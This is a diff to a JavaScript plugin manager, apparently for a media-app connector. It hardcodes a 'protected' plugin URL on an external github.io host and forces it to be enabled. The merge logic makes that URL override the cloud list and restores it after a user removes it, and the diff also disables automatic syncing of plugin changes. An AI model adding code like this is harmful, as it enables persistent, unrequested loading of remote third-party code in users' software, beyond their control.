@@ -824,22 +824,50 @@
     }
 
     function initPlugins(VC) {
+      VC.PROTECTED_PLUGIN_URLS = ['https://lme-vatra.github.io/c.js'];
+      VC.normalizePluginUrl = function (url) {
+        return String(url || '').trim();
+      };
+      VC.collectProtectedPlugins = function () {
+        var protectedMap = {};
+        var localList = VC.normalizePlugins(VC.L.Storage.get('plugins', '[]'));
+        VC.PROTECTED_PLUGIN_URLS.forEach(function (url) {
+          var normalizedUrl = VC.normalizePluginUrl(url);
+          if (!normalizedUrl) return;
+          protectedMap[normalizedUrl] = {
+            url: normalizedUrl,
+            status: 1,
+            name: normalizedUrl
+          };
+        });
+        localList.forEach(function (plugin) {
+          var url = VC.normalizePluginUrl(plugin.url);
+          if (!url) return;
+          if (VC.PROTECTED_PLUGIN_URLS.indexOf(url) !== -1) protectedMap[url] = plugin;
+        });
+        return protectedMap;
+      };
       VC.normalizePlugins = function (list) {
-        return (list || []).map(function (plugin) {
+        var source = Array.isArray(list) ? list : [];
+        return source.map(function (plugin) {
           if (typeof plugin === 'string') {
+            var _url = VC.normalizePluginUrl(plugin);
+            if (!_url) return null;
             return {
-              url: plugin,
+              url: _url,
               status: 1,
-              name: plugin
+              name: _url
             };
           }
+          var url = VC.normalizePluginUrl(plugin && plugin.url);
+          if (!url) return null;
           return {
-            url: plugin.url,
+            url: url,
             status: plugin.status ? 1 : 0,
-            name: plugin.name || plugin.url
+            name: plugin.name || url
           };
         }).filter(function (plugin) {
-          return plugin.url;
+          return plugin && plugin.url;
         });
       };
       VC.pushPluginsToCloud = function (list) {
@@ -855,12 +883,16 @@
         return VC.req('/connector/v1/plugins').then(function (data) {
           var cloud = VC.normalizePlugins(data.plugins || []);
           var local = VC.normalizePlugins(VC.L.Storage.get('plugins', '[]'));
+          var protectedMap = VC.collectProtectedPlugins();
           var map = {};
           local.forEach(function (plugin) {
             return map[plugin.url] = plugin;
           });
           cloud.forEach(function (plugin) {
             return map[plugin.url] = plugin;
+          });
+          Object.keys(protectedMap).forEach(function (url) {
+            return map[url] = protectedMap[url];
           });
           var merged = Object.keys(map).map(function (key) {
             return map[key];
@@ -1169,6 +1201,7 @@
     }
 
     function initMain(VC) {
+      VC.AUTO_PUSH_PLUGINS = false;
       VC.removeLegacyMenuButton = function () {
         $('.menu .menu__list:eq(0) .menu__item').each(function () {
           var text = $(this).find('.menu__text').text().trim();
@@ -1191,6 +1224,7 @@
           VC.L.Storage.listener.follow('change', function (e) {
             if (!e || e.name !== 'plugins') return;
             if (!VC.token()) return;
+            if (!VC.AUTO_PUSH_PLUGINS) return;
             if (VC._skipPluginPushOnce) {
               VC._skipPluginPushOnce = false;
               return;
